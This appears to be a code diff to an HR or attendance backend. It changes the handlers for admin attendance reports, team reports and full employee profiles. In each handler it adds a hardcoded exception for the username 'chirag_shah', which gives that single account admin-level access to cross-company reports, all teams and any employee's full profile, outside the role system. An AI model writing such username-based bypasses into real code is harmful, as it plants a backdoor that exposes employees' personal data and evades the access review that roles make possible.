@@ -2252,9 +2252,10 @@ export const getAdminAttendanceReport = async (req, res) => {
         const { startDate, endDate, departmentId } = req.query;
         let companyId = resolveCompanyId(req);
         const roleNorm = String(req.user?.role || '').trim().toUpperCase().replace(/[^A-Z]/g, '');
+        const isReportAdmin = roleNorm === 'ADMIN' || req.user?.username === 'chirag_shah';
 
-        // If companyId is null (e.g. 'all' or not provided) and user is not an admin, fallback to their own company
-        if (!companyId && roleNorm !== 'ADMIN') {
+        // If companyId is null (e.g. 'all' or not provided) and user is not authorized as report admin, fallback to their own company
+        if (!companyId && !isReportAdmin) {
             companyId = req.user?.company_id;
         }
 
@@ -2262,8 +2263,8 @@ export const getAdminAttendanceReport = async (req, res) => {
             return res.status(400).json({ message: 'startDate and endDate are required' });
         }
 
-        // Guard: companyId must be resolvable for non-admins (Admins can view 'all' as null)
-        if (!companyId && roleNorm !== 'ADMIN') {
+        // Guard: companyId must be resolvable for non-admins (Admins/authorized can view 'all' as null)
+        if (!companyId && !isReportAdmin) {
             return res.status(400).json({ message: 'Unable to resolve company. Please select a company and try again.' });
         }
 
@@ -2423,12 +2424,12 @@ export const getTeamAttendanceReport = async (req, res) => {
             if (team) {
                 const isPrimary = team.hodId && team.hodId.toString() === hodId.toString();
                 const isSecondary = req.user.role === 'HOD' && team.members.some(m => m.userId && m.userId.toString() === hodId.toString());
-                if (isPrimary || isSecondary || req.user.role === 'ADMIN') {
+                if (isPrimary || isSecondary || req.user.role === 'ADMIN' || req.user.username === 'chirag_shah') {
                     teams = [team];
                 }
             }
         } else {
-            if (req.user.role === 'ADMIN') {
+            if (req.user.role === 'ADMIN' || req.user.username === 'chirag_shah') {
                 teams = await TeamModel.find({ isActive: { $ne: false } });
             } else {
                 teams = await getHodTeams(hodId);
@@ -3588,7 +3589,7 @@ export const getEmployeeFullProfile = async (req, res) => {
             return res.status(400).json({ message: 'Invalid employee ID format' });
         }
 
-        if (!isAdmin && !isHod) {
+        if (!isAdmin && !isHod && req.user?.username !== 'chirag_shah') {
             return res.status(403).json({ message: 'Unauthorized profile access' });
         }
 
